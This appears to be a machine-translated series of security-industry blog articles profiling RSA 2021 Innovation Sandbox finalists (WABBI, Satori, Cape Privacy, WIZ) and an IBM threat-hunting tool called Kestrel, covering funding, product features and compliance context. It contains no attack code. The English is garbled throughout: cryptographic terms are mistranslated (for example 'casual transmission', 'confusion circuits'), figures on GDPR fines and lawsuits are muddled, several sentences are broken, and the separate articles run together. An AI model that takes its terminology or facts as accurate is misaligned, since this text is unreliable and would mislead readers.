WABBI automates the policy orchestration, which does partly solve the problem caused by the manual management of multiple projects, but from the Demo provided on its website, we can see the continuous expansion of its support policies, and different policies can be added under each policy category, so as the number of management projects increases, the number of policies will increase exponentially, and whether the performance of the final policy arrangement engine will affect is a concern for WABBI.

From the current development of W A B B I, Inc., I believes that W A B B I wants to continuously expand its adaptation to the mainstream DevOps tools, but more adaptation will inevitably lead to certain performance problems, how to integrate the adaptation interfaces of different DevOps tools to form a set of universal interfaces, and can drive the adapter through a parameter specified way is an optional means, WABBI will consider how we do not know, but this must be a challenge for WABBI.

From the perspective of the product power behind it, the author believes that WABBI still has certain innovation and advantages. After all, most of the current products in the current market have practiced the DevSecOps concept, such as ForAllSecure Company, which was shortlisted for R S A innovative sandbox in 2020, DisruptOps(cloud infrastructure detection and repair in 2019) and ShiftLeft(software code protection and audit) in 2019.

But there are very few products that have successfully implemented the SecDevOps concept.

It is worth noting that from 2019-2020, the companies shortlisted in the DevSecOps direction have not entered the final Top 3,. On the one hand, which reflects that the DevSecOps direction may receive less attention than other directions. On the other hand, it also indirectly shows that it is difficult to appear disruptive innovation points in the field. No matter what the final result is, I hope that WABBI can continue its innovation and advantages and bring better products to the market.

As the "Oscar of the security circle", the Innovation Sandbox(sandbox) competition has attracted much attention every year and become a vane of technological innovation and investment in the global network security industry.

Not long ago, RSA officially announced the top ten innovative sandbox startup: WABBI, Satori, Abnormal Security, Apiiro, Axis Security, Cape Privacy, Deduce, Open Raven, STARATA, WIZ.

Green Alliance will introduce you to the top ten manufacturers through background introduction, product characteristics, comments and analysis.

Today, we want to introduce the manufacturer is: Satori.

Satori Cyber was founded in 2019 by founders Eldad Chai and Yoav Cohen, and received a $5.25 million seed round in the same year.

Co-founder and CEO Eldad Chai were former senior vice president of product management and senior executive team members at Imperva; Yoav Cohen is the co-founder and C T O of Satori Cyber and former senior vice president of product development at Imperva.

The company is committed to meeting the needs of data security and privacy compliance through data classification, audit, strategy and other technologies and means.

The objectives of Satori Cyber products are to display specific users who access data; to allow the user to define and implement access policies for data; to warn users of any abnormal activities; and to check and respond to data security threats.

The EU G D P R, which came into effect on 25 May 2018, is called the "strictest" regulation in the EU, and Google, Facebook, received lawsuits against the EU with 3.9 billion euros and 3.7 billion euro fines respectively on the effective date of the GDPR.

California's CCP A, which then came into effect in 2019, set forward strict definition and protection requirements for the protection of personal data or information, which have become established standards in the security and privacy industries.

The Washington Senate in February 2020 approved the Washington Privacy Act (W P A) in February 2020, which followed in the footsteps of GDPR,CCPA privacy regulations to advance the state's data privacy rules.

The new regulations have triggered new industry considerations for data security and privacy protection. Using the own privacy security settings of the original data platform can only meet some of the requirements stipulated by data security and privacy protection laws.

Rather than want to meet data security and privacy compliance through expensive reconstruction infrastructure, companies want to solve data security and privacy issues by using low-cost replacement parts of data infrastructure (such as storage and query engines) or relying on endpoint agent deployment.
Satori proposes a data access control platform to meet the data security and privacy protection requirements of regulations such as GDPR, CCPA, HIPAA by relying on full data flow visualization, forced access control and rich data access context.

Satori uses a new approach enables the product visualization of full data streams, enforces secure access control, and compliance with data security and privacy policies, while making legal access easy, fast, and efficient.

Satori is a single platform, located between the user or the application layer and the data storage layer, which can solve all the cloud legacy data access and data use problems, and complete the data management and protection.

Data access security, privacy, and compliance policies when using data storage and data by combining users with real-time data mining, classification, and behavior analysis.

Satori is a data proxy service, where the data user or application will not be directly connected to the actually stored data, but rather to the Satori proxy service.

Satori is the security control service deployed between the user or application layer and the data layer, providing a data access control platform to monitor, classify and control access to sensitive data.

Satori can view in real time users using the data, which data they are accessing, and how to use it.

Satori is visualized by monitoring users and groups and labeling data, and then counting those users who are using those data, using tables and icons.

Access control for the Satori enables flexible, fine-grained access control management through the DAC (Data Access Controller).

The DAC is managed by the customer to set up the access, use, and management of its data.

The DAC supports role-based Access Control (RBAC) -based, Attribute Access Control (ABAC), and access to tables, columns, rows, and objects.

And select fine-grained access control according to data storage automation.

Enables sensitive data for security-compliant data analysis.

Meet regulations such as GDPR, CCPA, HIPAA and provide the required fine-grained data access statistical maps and access audit reports.

Automated Selection of Diversified Fine-grained Access Control Policies Stori establishes an access control management between cloud services and users or applications, enabling diverse fine-grained access policies through DAC automated selection.

Monitoring of data access can be achieved without affecting the structure and deployment of the data in the original cloud, and reports of all data storage and access review statistics are generated as legally required.

Sensitization engine targets the protection of privacy data. Satori adopts the Universal Data desensitization (Universal Masking Engine) engine to achieve compliance management, and institutions or organizations can safely analyze and use the sensitive and desensitized data.

Satori designed the desensitization profile to define the desensitization transformation for each data type, and for semi-structured data, Satori utilizes dedicated field settings.

Corresponding conversion method Satori desensitization method has general desensitization, email desensitization, credit card desensitization, birth date desensitization, public IP desensitization data fine grain desensitization, the following example: general desensitization email desensitization comment: Satori products provide rich desensitization method, and support flexible configuration is one of its highlights.

However, Satori claims that sensitive data after desensitization can be used and analyzed in compliance.

For example, whether privacy data providing third parties after desensitization really meets CCPA and GDPR compliance is further questionable.

It is worth affirming that in the era of big data, with the disclosure of data on the Internet and the rampant black and gray production, the risk of desensitization data in the process of data circulation and sharing with the assistance of external data sets.

For this data security risk, there are some studies at home and abroad, such as Privacy Analytic proposed a set of risk assessment and testing schemes to control and manage privacy risks to reduce the compliance risk of enterprise processing of sensitive data; Green Alliance Technology also studied the security issue, proposed the data desensitization-desensitization effect evaluation framework, and landed into the use scenario of data desensitization products, and continuously promote the standardization of the evaluation method with Tsinghua University, China Institute of Electronic Technology Standardization and other institutions.

Satori has built-in data classification, which is performed by automatically classifying data using machine learning-based methods and creating maps of data lists and generic directories by homomorphic methods.

In addition, Satori provides an overall illustration of sensitive data and access patterns to the organization or organization based on the classified data access statistics.

Five, the summary throughout the international data security environment more and more laws and regulations on data security and privacy protection put forward the specific requirements and provisions, our country also put forward the requirements and guidance for data security, implemented on June 1,2017, the network security law of the People's Republic of China, emphasizes the protection of infrastructure and personal information.

On May 1,2018, the implementation of the information security technology personal information security specification, and is formulating the data safety law and the personal information protection law and other security laws and regulations, from the national standard level made clear the enterprise collection, use, share personal information compliance requirements, for the enterprise privacy policy and personal information management specification pointed out the direction.

Satori Cyber is committed to making data privacy protection deployed quickly and conveniently to meet legal requirements through data classification, audit and access control.

The product is characterized by establishing a secure access control service between the cloud and users, achieving fine-grained access control management, and clearly displaying the data access.

In addition, sensitive data and privacy data are protected through desensitization technology.

Products can be deployed quickly under compliance regulations and have little impact on system efficiency.

At the same time, data security, and privacy protection are based on trust in the management of Satori, which is certified by ISO/IEC 27001:2013 Information security management systems.

In the case of increasingly severe data theft need more through the use of isomorphic encryption technology encryption, or consider to use access control to achieve some key management, using key encryption of data encryption, access control users can get decrypt key and decryption data more secure ways to protect sensitive data and privacy data.

In a variety of data security and privacy protection laws issued the stage of Satori meet the existing laws and regulations can achieve rapid deployment and do not need to enterprise data infrastructure adjustment, comprehensive meet the regulations of data security and rapid deployment and does not affect the system efficiency of Satori has a good competitiveness.

As the "Oscar of the security circle", the Innovation Sandbox(sandbox) competition has attracted much attention every year and become a vane of technological innovation and investment in the global network security industry.

Not long ago, RSA officially announced the top ten innovative sandbox startup: WABBI, Satori, Abnormal Security, Apiiro, Axis Security, Cape Privacy, Deduce, Open Raven, STARATA, WIZ.

Green Alliance will introduce you to the top ten manufacturers through background introduction, product characteristics, comments and analysis.

Today, we want to introduce the manufacturer is: Cape Privacy.

Cape Privacy was founded in January 2018, and is headquartered in New York City, United States.

The current funding totaled $25 million, including the latest $20 million in Series A funding, led by Evolution Equity Partners, and a number of investment companies including Tiger Global Management, Ridgeline Partners, Version One ventures, Radical ventures participating in [1].

Its founder and CEO is Che Wijesinghe,, who has an extensive experience and management background in cyber security, serving as an executive at Datalogue (acquired by Nike), OmniSci, Composite Software (acquired by Cisco); Some other members of the team, from multiple countries in the United States, the UK and France, include David Besemer, Morten Dahl and Ben Decoste, with technical backgrounds in the fields of cryptography, data science and computer, [2].

Through the machine learning and cryptography technology, the company is committed to building and realizing an enterprise-level SaaS platform with multi-party data collaboration and privacy protection, aiming to solve the sensitive data sharing problem under privacy supervision.

In 2021 this year, RSA innovation sandbox of ten selected companies, there are three data security companies.

In addition to the Cape Privacy, described in this article and Open Raven and Satori,, the latter two focus on sensitive data discovery / classification, data leakage monitoring, and are related to data security governance.

In last year's 2020 Innovation Sandbox Race, many said the Securiti.Many parts of the ai title belong to business reasons and luck.

Then, returning to the technology-led innovation, Cape Privacy, as an advanced technology such as encryption machine learning and cryptography, realizes multi-party data cooperation and privacy protection schemes.

It has been nearly three years since now, and a number of huge corporate fines have been issued.

According to 616 fines in 2018, according to GDPR's law enforcement tracking website.

Google is representative fines, —— as a large international Internet company, Google has been fined by two EU countries: France in January 2019, because law enforcement that Google's privacy provisions do not fully reflect the principle of GDPR transparency and clarity, and Sweden fined 7 million euros, because Google failed to fully fulfill the GDPR gave users data "right to forget".

With GDPR as a bellwether, various countries around the world have introduced new data security and privacy legislation, and tend to be stricter.

According to the current statistical [4] of the United Nations Trade Development Organization (UNCTAD), 132 of the 194 countries around the world have enacted data privacy laws, including the EU, the United States, China, Russia, and India and Australia, Canada and Japan, accounting for 66% of all countries.

Representative is California, as a gathering place for technology innovation companies, implemented the California Consumer Privacy Act (CCPA) in early 2020 and opened the California Privacy Act (California Privacy Rights Act (CPRA) at the end of 2020, which is regarded as an enhanced version of CCPA, with more strict provisions added to CCPA.

Recently, China's "Data Safety Law" and "Personal Information Protection Law" passed the second review stage, the distance of the two heavyweight regulations are getting closer and closer.

Whether abroad and domestic, these regulations undoubtedly bring huge compliance pressure and challenges to enterprises (whether giants, or small and medium-sized enterprises).

With the digital transformation and artificial intelligence strategy, advanced technologies such as deep learning and machine learning have been widely used and promoted in the digital fields in all walks of life.

However, with the implementation of regulations such as GDPR, CCPA, the application of AI, especially in cross-party enterprises, has a higher compliance risk.

For example, GDPR imposes high restrictions on the processing and sharing of personal data, and Article CCPA clearly states that user data cannot be shared with third parties without the consent of consumers.

However, it maximizes the value of data in the flow process, and there are more and more data sharing, computing and exchange scenarios and needs between enterprises, which poses a huge obstacle to the digital transformation and AI strategic value of enterprises.

How to ensure data value mining in data sharing and ensure data security and compliance is a key problem.

Cape Privacy claims to create more powerful AI solutions where businesses can implement collaborative machine learning without leaking any confidential data, enabling the value of acquiring data in secure and trusted access to sensitive data.

Is this the solution to the compliance challenges in data sharing?Next, we analyze and interpret Cape Privacy's products and applications.

Cape Privacy's development team took two years from 2018 to 2020 to launch the Alpha version of the —— Cape platform beta of the company's products.

According to a recent interview, its company CEO claimed that the product has been greatly improved and refined in 2021 and is commercially available in some scenarios.

It's worth mentioning that the startup promotes product incubation through project open source and community models, with not only Cape Privacy employees building the framework and contribution code, but also some external developers adding the contribution code.

This section first interprets the Cape Privacy company's product —— Cape platform, then introduces the application scenarios of the company's products, and finally introduces several representative and product-related Github open source projects led by Cape Privacy.

Cape PlatformThe Cape Platform is a multi-party machine learning data collaboration platform based on encryption that improves business value through advanced cryptography, privacy protection, and machine learning technology to ensure improved data models as enterprise organizations share data safely.

A, B and C three companies want to achieve joint modeling through data sharing, for example, three different banks want to integrate a large number of data samples, to jointly establish a credit score risk control model.

However, the reality seems that the three banks are unable to directly share these sensitive data due to customer privacy, and legal compliance.

However, the Cape platform can encrypt the original sensitive data (such as homomorphic encryption, cryptography, secret sharing, casual transmission, confusion circuits and other password technologies through encryption machine learning technology), and conduct computing and joint modeling in the encrypted data.

The raw data is not local, that is, the A, B and C company outflows are encrypted, do not expose sensitive information, realize computation and learning (work with protected data without decrypting it) without being decrypted, and achieve the "available and not visible" effect.

Box diagram of multi-party sensitive data sharing for the Cape Platform Specifically, the Cape platform currently offers three core components: Cape Cloud Services (also known as "Cape"), where users can build new data science projects to work with other organizations.

The service also includes Cape agents, where users can connect to the cloud services easily and securely.

Cape Workers, is powered by users to manage and run encryption learning tasks, such as using Cape Workers to access local data, use secure multi-party computing to encrypt data for local data, and connect it to the Cape agent.

Python library pycape, by using pycape, users can interact with his Cape project, view and update the project details, and can manipulate the dataset or upload the dataset encryption to Cape.

From the three core components above, the Cape platform is actually a cloud-locally deployed computing architecture.

Since the raw data and the intermediate computing state are encrypted and the computing tasks are performed in the encrypted data, the cloud service can be a third party, the public cloud.

According to official reports, the deployment is currently supported in the Amazon Cloud S3.

This is consistent with Cape Privacy's vision that —— gives customers a secure and available enterprise SaaS platform supporting cryptographic machine learning.

Since the Cape platform is a data collaboration platform involving multiple parties, the Cape cloud service supports assigning different roles to different participants to meet different permissions and production needs.

These roles can be divided into [6] categories, organization and project roles, with specific responsibilities: 1) Organization roles (Organizational-Level Roles) with three categories: Organization Administrator (Organizational-Level Administrator): Administrator has full permissions to all functions on Cape.

It is in the role of superadministrators who need to be used with other users and have the highest level of permissions on Cape.

Have full permissions to the organization, including: you can add or delete people to the organization, change the role of any member of the organization, and delete the organization.

In addition, you have all the project-level administrator privileges given in the following article.

Operator (Operator): The operator controls the organization's token, and deploys, runs, and monitors the Cape Workers.

They are able to undo the token and view all project and project activities of the organization.

Permissions include the ability to view all organization projects and work / project activities, the ability to issue / revoke organization tokens, and the ability to install and download Cape Workers. s

Users (User): Cape users can view the projects they belong to, or join and leave those invited to attend.

They can only view and join projects that are invited by a Cape organization or a project administrator.

Permissions include an organization or project administrator inviting me to join and leave the project, view project pages, and logs, but you cannot change data views / tasks, approve, or reject tasks.

Project-level roles, with 3 categories: Project-level Administrator: The Project Administrator has its full permissions to organize their projects on Cape to add and edit participants on the projects they belong to and perform the necessary project operations, such as adding and deleting data views or approving and running encrypted learning tasks.

Complete permissions for all projects that the organization belongs to, including: You can add or edit contributors to all projects, you can add, delete data views for all projects, and have encrypted learning tasks that can approve and run all projects, as shown in Figure 2.

Figure 2 Task Management (require consent, run, complete) Data Scientist (Data Scientist): Data scientists can add, delete, and edit data views, as well as create, run, reject, and approve encrypted learning tasks for projects.

They can only view and join projects that are invited by a Cape organization or a project administrator.

Data scientist rights include: organization or project administrator invited me to join and leave the project, can add, delete your data view of the project, can create for the project, approval, run encrypted learning jobs, if your organization is the model owner, can access the job measures and model weights.

User (User): Project-level users have the same permissions as organization-level users (as described above).

Cape platform in addition to learning and computing in encrypted data, participate in the characteristics of a variety of roles, also has the following functional characteristics: encryption machine learning model training speed faster Cape Privacy optimized the encryption machine learning underlying encryption protocol, make the use of encryption data without too much computing overhead and delay, but also improve the success rate of machine learning.

Supporting visualization during the multi-party data collaborative training process is shown in Fig, and the multi-party data collaborative training process is visualized.

Security of technology endorsed through peer review Cape Privacy's basic core values are respect, cooperation, and trust.

How to ensure that privacy technology is trusted and secure.

Cape Privacy adopts the public release of new privacy protection technologies, peer review mechanisms, and some technical achievements will be published in conference journal papers.

At the same time, through open source projects and community mode driving product incubation, some underlying algorithm libraries can be open and transparent.

Cape platform products can be applied in three scenarios: Financial Services crypto machine learning allows financial institutions to work with other third parties to eliminate bias from datasets and identify some basic facts.

Life sciences address biased or inaccurate data and models by using personal medical information (PHI), health, and clinical trial data, and by using machine learning across tissues.

The government encrypts location or other personal information to eliminate potential data abuse while driving advances in public security.

Cape Privacy open source multiple encryption machine learning related projects in Github, with three representative projects described below.

One of the three components at the core of the pycapeCape platform is a Python-written module that enables data interaction with the Cape Cloud Services component.

The project has been active in the last year.

Specifically, with the pycape module, you can do this to create and query data views, or point to the data location required during the training of an encrypted machine learning model in the Cape cloud service.

Submit and track tasks that can be viewed as computational sessions and contain instructions on how to train the model.

It encapsulates some cryptographic underlying protocols with libraries, providing only an interface similar to TensorFlow with the purpose of making the technology still called without research and developers are experts in cryptography, privacy protection.

TF Encrypted performs substantial optimization for tensor-based applications, and relying on the backend of TensorFlow means that runtime performance is comparable to standalone TensorFlow framework runs.

As can be seen from Cape privacy's official website and the open source project, the core technology of the enterprise SaaS platform with multi-party data collaboration and privacy protection is the core technologies such as secure multi-party computing and homomorphism encryption.

In fact, the Cape platform supports multi-joint machine learning modeling and training, which is almost completely similar to the recent implementation of ——, federated learning, an innovative technology in the field of data security, and therefore can also be regarded as a federated learning scheme.

The following is an intuitive understanding of federate learning (encrypted machine learning) from a simple example, and then a comprehensive overview of its principles and development.

The Cape platform does not need to decrypt cipheric data, that is, data processing and machine learning training can be realized in encrypted data, in which advanced cryptographic technologies such as homomorphic encryption, secret sharing, confusion circuits, and casual transmission are used.

Homomorphic encryption technology is how to build an encrypted machine learning (federated learning) scheme, the official website gives a simple example.

First, consider a n ordinary algorithm like a + b = c that produces 5 if you enter the 2 and 3 functions.

Now consider a special encryption function, such as Enc (a) + Enc (b) = Enc (a + b) =Enc (c), a property called satisfying the "additive homomorphism encryption" property, such as the Paillier encryption system.

If you enter Enc(2) and Enc(3), to arithmetic them Enc (2) + Enc (3), then Enc(5). is generated

Then, in this process, the two numbers can be added up without decrypting to produce the output.

The resulting output is still encrypted and can only be decrypted by someone using the key and the answer is 5.

The same method can be applied to cryptographic machine learning models, such as linear regression is an addition and a matrix multiplication: aX + b = Y; linear regression of encryption is: Enc (aX) + Enc (b) = Enc (Y), linear regression model running encrypted data will produce encrypted Enc (Y) results.

This allows the user to train and predict the machine learning models in the encrypted data without exposing or reading the data, as shown in FIG. 4.

This means that data scientists can achieve the collaboration and sharing of multiple data through this technology, and thus improve the accuracy of their models.

Federated Learning Overview The Federated Learning concept, first proposed by Google in 2016, was originally used to solve the privacy protection problem of large-scale Android terminal collaborative distributed machine learning, which organically integrates machine learning, distributed communication, and privacy protection technology and theory.

With the strengthening of global privacy regulations and the strong demand for data utilization, it has been developing rapidly since the concept of federal learning has received widespread attention in academia and industry.

Federated learning enables multiple participants (e. g., enterprises, user mobile devices) to achieve joint machine learning modeling, training, and model deployment without exchanging raw data (also expressed as "sensitive data is not local").

Federated learning can be divided into three categories according to the different scenarios involved using the dataset: lateral federated learning, longitudinal federated learning, and federated transfer learning.

According to the type of federated learning algorithm, it can be divided into federal linear regression, federal lifting tree, federal neural network, etc.

The federated learning to be solved are the problems of algorithm efficiency, accuracy, communication mechanism and the integrity of participants.

There are two types of scene applications in federal learning: privacy data acquisition and machine learning of B2C scene —— mobile devices, such as Google and Apple in Android, iOS devices; sensitive data sharing and machine learning between —— enterprise organizations in B2B scenarios, such as joint risk control model by multiple banks.

In the specific industry application, many domestic and abroad enterprises have carried out exploration, and realized some commercial landing cases.

For example, Google applies federated learning on news recommendation for Android phones, and open source TensorFlow Federated framework; Intel combines TEE (trusted execution environment) technology with federal learning; domestic WeBank represents federated learning in insurance pricing, image detection, and open source FATE federated learning framework; In addition, Baidu, Tencent and JD have launched federal learning-related products and applications.

Specific introduction of federal learning technology can refer to the article "Ten cutting-edge data security technologies, focusing on enterprise compliance pain points" and related research reports.

Whether it is the future implementation of EU GDPR, US CCPA, or China called the Data Safety Law and the Personal Information Protection Law, the security problem urgently needed by domestic and foreign companies —— follows data security compliance.

In order to meet the challenges, from the current compliance products and application market, the author divides the compliance products into three categories: The first category is the related products and tools to meet the explicit compliance needs, such as Securiti.Compliance check collaboration platform from ai and OneTrust, requests for user data rights-response automation tools; The second category is the products that can effectively reduce the compliance risk of internal enterprises, Generally, the sensitive data "identification-protection-assessment" as the basic system of data security management scheme, Such as the sensitive data identification products provided by BigID, and Microsoft, IBM's data desensitization products, And domestic classification classification, data desensitization products, The direction of the technology and the market is more mature; The third category is the compliance technologies and products that support sensitive data sharing and transmission across enterprises, What attracts such products is meeting compliance while achieving great business value.
Privacy regulations at home and abroad explicitly and implicitly point out that enterprises are generally not allowed to share private data with third parties, but they generally give two paths directly or indirectly: one is to solicit the consent of all users, and the other path is to process the original personal data, which has achieved the goal effect of "anonymizing information".

Clearly, the multi-party data collaboration and privacy protection schemes offered by Cape Privacy fall in the third category.

The company's product Cape platform, by combining advanced cryptography and privacy protection with machine learning (federated learning technology), ensures that it improves the data model and improves the business value under the security of multi-party data sharing across enterprises.

It is worth mentioning that in 2019, RSAC Innovation Sandbox ——Duality Company also belongs to the third category, which conducts the commercial application of homomorphism encryption technology through customized hardware and algorithm optimization (RSA2019 Innovation Sandbox Duality: Based Data Analysis and Privacy Protection Scheme).

If 2019 is the first kind of innovative technology in commercial application, after two years of rapid development, due to its considerable business value gradually form a new track in the field of data security, Cape Privacy in the project open source drive, new technology after strict review, more scene application, cloud service mode, etc., these show great progress in the field, technology research began to industrial ecological, business model gradually formed.

In its 2020 forecast, Gartner called homomorphism encryption, security multi-party computing, confidential computing (TEE) as privacy enhanced computing (Privacy Enhanced Computation) technologies, and its operation and artificial intelligence engineering as six major strategic technology trends in 2021. The value of its technology still has huge space for research and development in the future.

Data security has been the focus of the R S A C innovative sandbox competition for four consecutive years since 2018 and 2021, with at least one data security startup selected each year.

This year is a explosive point, there are three related companies ——Cape Privacy, Open Raven, Satori, Open Raven focus on cloud asset discovery, sensitive data discovery / classification and data leakage monitoring, Satori focus on sensitive data discovery / classification, access control strategy and data desensitization, according to the previous division principle, they belong to the second category, is to reduce the compliance risk of data security governance related products.

In the first three years of innovative sandbox competition, B i g I D won the championship in 2018 (category 2, data security governance), 2019 Duality runner-up (category 3, commercial application of cryptographic encryption technology), 2020 Securiti.Champion ai (category I, meeting explicit compliance with GDPR/CCPA).

Cape Privacy, through cryptographic machine learning (federated learning) technology, strives to build and realize an enterprise-level SaaS platform with multi-party data collaboration and privacy protection, aiming to solve the sensitive data sharing problem under privacy regulation.

From the perspective of technological innovation, technology is innovative and novel; the value return is considerable due to data sharing and machine learning business, especially in sensitive fields like finance, healthcare; the CEO has the management experience of several successful startups, and some other team members have a technical background in cryptography, data science and computer fields.

Interestingly, their technical team, from many countries in the United States, the United Kingdom and France, has natural "distributed" genes.

Based on the above analysis, the author continues to be optimistic about the three data security companies of R S A C innovative sandbox in 2021, and believes that Cape Privacy is more likely to win this year's championship.

These cumbersome operations not only affect the efficiency, but also reduce the combat effectiveness of safety personnel.

At the R S A Conference 2021, researchers from IBM proposed the brand new threat hunting tools that can effectively reduce the tedious work in the hunting process, refocus hunting on its creative and exciting parts and achieve fun return."Threat hunting" means manual analysis and machine-assisted methods for active search, association, and analysis of networks and data to detect a high-level persistent threat (APT) that escapes existing security defenses.

In the process of threatening hunting, security personnel mainly think about and solve two kinds of problems: how to hunt?Examples are "How to Query Data from an EDR,"  "How to extract a Data Field,"  "How to Supplement Context Information for Clues,"  "How to Use a Machine Learning Model", etc.

What is hunting?Such as "How to build hypotheses,"  "how to conduct analysis based on hypotheses,", "which threat intelligence data is needed to participate in the analysis," and "which machine learning model is appropriate for analysis", etc.

The current pain point of threat hunting is that "how to hunt" takes far more time than "what to hunt", " but the latter is the focus of value creation.

Security personnel waste too much time reading the A P I query interfaces of various EDR's to focus on the threat assumptions and attack plot analysis sections that are more valuable to threat hunting.

Kestrel researchers recommend a brand new open source project, "Kestrel", can reduce security input in "how to hunt" and focus on threat hunting.

To achieve this goal, Kestrel defines the programming language for threat hunting, which can help users to hunt more efficiently.

To help users focus their target on hunting, the Kestrel programming language adopts a grammar that facilitates the hunting target description in design concepts, facilitate the representation of hunting target entities.

The standardization and standardization of STIX data is the key to the effective conduct of threat hunting. Only standardized data formats can be collected from different systems for hunting.

Researchers from the IBM recommend using the International Threat Intelligence Standard STIX for data representation and sharing.

To achieve the direct secure sharing of secure data between different systems, IBM has proposed the concept of Security Connect, and one of its core technologies is STIX-Shifter engineering.

The project uses STIX (Structural Threat Information Expression Structured Threat Information eXpression) to securely share the threat information.

In this project, STIX-Shifter maintains the consistency of the data received from all IBM Security products and the various third-party products.

By providing the general service of the same universal API, IBM can now query data across any data source, whether the data source is a product or a storage warehouse, and harvest the same data into analysis and search.

The researchers shared cases of how to threaten a hunting environment based on free tools.

In the case, combined with the path of the hacker attack, Sysmon, Sysflow, SIEM and other software tools are used to conduct data monitoring and collect respectively in the attacker's phishing mail delivery, horizontal movement, C & C contact and communication, data access, data exudation and other processes.

The collected data were normalized and provided for a threat hunting platform.

Eventually security personnel can use Kestrel for threat hunting analysis on a threat hunting platform.

After threat hunting enters the actual practical application stage, how to improve the hunting efficiency of safety personnel in the actual operation process is a concern in the industry.

The scheme launched by IBM researchers can become one of the options for threat hunting. The scheme has many highlights: 1. The hunting scheme adopts open source / free software to reduce the construction cost; 2. Hunting scenes are designed and deployed based on the hacking process, which is worth reference in terms of systematic construction of threat hunting ideas; 3. The new hunting tool / language Kestrel can greatly improve the traceability efficiency and remove security personnel from the sea of hardship.

Kestrel can help security people reduce the overhead of heterogeneous data information acquisition, cumbersome basic operations, but it is still manual hunting operations.

Next, how to automate threat hunting as much as possible based on the automatic association of attack cues is expected to become a new technical direction.

WIZ, a newly formed Israeli company in 2020, is small to just about 65 people, working in Palo Alto, California, and Tel Aviv, Israel.

The startup, led by a team that led Microsoft's cloud security team and created cloud security startup Adallom,, which offers S a a S security solutions, was acquired by Microsoft for $320 million in 2015.

Later, Adallom software became part of a range of security tools that Microsoft began selling to the company.

The company name WIZ represents Wizard,, the wizard, for someone with magical abilities.

WIZ believes that the nature of magic is defined through a deep understanding of the environment and using natural means to create seemingly impossible results, and that its company stems from the idea designed to use security methods to solve today's seemingly impossible customer problems.

On December 9,2020, just about nine months after the company's inception, and WIZ stood out from $100 million in Series A funding from Index Ventures, Sequoia, Insight Partners and Cyberstarts.

After completing $130 million in Series B funding in April 2021, WIZ became the fastest-growing security startup at a valuation of $1.7 billion.

Cloud computing technology has been widely applied and in the information construction of all walks of life, cloud infrastructure has become an indispensable tool for almost all enterprises, and the resulting security of cloud infrastructure has also become a key issue that enterprises need to pay attention to.

Many cloud service providers today have launched security services and solutions for cloud environments, such as Microsoft Azure, AWS and Oracle, as well as security detection tools for specific environments written by some teams, such as Kube-hunter (for Kubernetes clusters), KubiScan, etc.

When WIZ's founding team was leading the Microsoft Cloud Security Group, they realized and realized the dilemma of the security team in existing cloud security solutions ——, today's cloud security tools, complex, and generated too many alerts for the security team to handle them timely and efficiently.

To address these issues, WIZ, after talking with hundreds of CEOs to verify the requirements, has designed to build a platform that allows security teams to scan its environments across computing types and cloud services without using agents for vulnerabilities and configuration, network, and identity issues.

Today I want to introduce for you is this full-stack cloudy security platform.

The WIZ platform integrates the context information of alerts and merges it into a more visible chart to associate issues together to identify possible penetration vectors and help security teams fix it efficiently and reasonably based on the risk levels in the chart.

1. Compared to the security detection of specific tools such as clusters, WIZ will scan the whole cloud stack, not only the infrastructure layer, but also the workload layer and application layer, and the scanning results will be displayed in the form of a chart, with strong visibility.

WIZ uses unique technologies that allow businesses to perform in-depth scans in VM and containers without agents, and to analyze all workloads even if resources are not online.

Most cloud providers today have cloud services for their own products and environments, while WIZ can connect to all cloud environments, whether a public cloud like Amazon Web Services, Microsoft Azure and Google Cloud Platform or OpenShift, and to managed container services and their own Kubernetes clusters.

No proxy overrides all resources that used to evaluate the security of virtualization resources in the cloud, generally requiring the deployment of Agent agents, or using sidecar agents, but such mechanisms are somewhat invasive.

WIZ scans all VM and containers in the cloud environment without deploying agents and cannot overrides blank resources because there is no need to install agents.

The WIZ scan face also covers transient resources dynamically created for autoscaling, which the general agent is unable to scan.

Fixed Workflow WIZ integrates workflow and service bill solutions like Jira and ServiceNow, so you can create bills directly from WIZ.

You can also create automated programs that send key notification alerts to messaging applications such as Slack or via email security teams to facilitate team communication management.

Product Advantage Fast company CEO Rappaport says the product can join the customer network at a minute level and scan its cloud network in less than a day, while it takes to start running a system relying on agents (such as Palo Alto Networks Networks for tracking activities) takes 12 to 18 months.

Emily Heath, Chief Trust and Security Officer of WIZ client DocuSign, said that the immediate, out-of-box visibility and reduced risk provided by WIZ, "WIZ make it one of the best security tools I see for a long time," and that visible "fast" is one of its core strengths.

When WIZ finds security issues, it scans the entire stack.

This includes the infrastructure layer (network, identity, cloud configuration), the workload layer (the patch level, vulnerability, key), and the application layer (the software stack, the database Web server, etc.).

Multilayer scanning enables WIZ to detect and analyze complex scenarios that may otherwise require integration across a large number of tools.

WIZ cross-cloudy environments W I Z products support multi-cloudy environments.

Including the AWS, Azure, GCP and the Kubernetes.

Agent WIZ is required to use a so-called agent-free method that claims "connection rather than deployment", with fast installation efficiency and high environmental coverage.

The team said its scans were done entirely out of band and had no impact on the customer environment.

This ensures zero friction in the production environment and allows for a very large scale, while only requiring minimal maintenance in the long run.

"WIZ is not just a security tool," said Anthony Belfiore, chief security officer of AON, a new way to see cloud security.

It is a new method to detect possible vectors of attack without affecting the production environment.

WIZ is something this market has been missing for the past decade."From the above evaluation, this" agent-free, cloud-native " method is undoubtedly an agent-based method compared with the agent-based method, and is also a core advantage of the product, but it may involve commercial interests, so the company has not announced the details of this technology implementation.
Visibility Threat Analysis In Microsoft's work, Rappaport felt the experience of security teams being overwhelmed with alarms, so the designed WIZ connected all alert information to a chart, allowing each security team to protect assets efficiently based on alert analysis results, rather than get lost in them.

Mature founder team WIZ has worked in the security field for more than several decades, and has worked together with the Microsoft Cloud Security Group for more than four years, and has a deep understanding of the security protection of cloud infrastructure.

WIZ can make and execute decisions for customers faster than the cumbersome processes of large companies.

According to the current public evaluation and display function, WIZ launched this full-stack multi-cloud security platform compared with today's security detection tools, and indeed meet what Assaf Rappaport calls "a new cloud infrastructure security and governance method" —— does not interfere with the cloud security risk management of the current business, without agent, detect the complete cloud stack, can operate all the data, meet the existing workflow products and can be implemented immediately.

It is with the many product advantages shown so far that it has won a lot of investment and customers in just over a year after its establishment.

However, the most important feature of the product, —— without agent, lacks details in its product introduction and related articles, so we can not judge its technical principle. If it said, a fast and comprehensive security assessment can be achieved, it will really solve a big problem of risk assessment on the cloud.

So it is extremely favored by capital, not only because of the "inflation" of investment in the post-epidemic era, but because of its real materials.

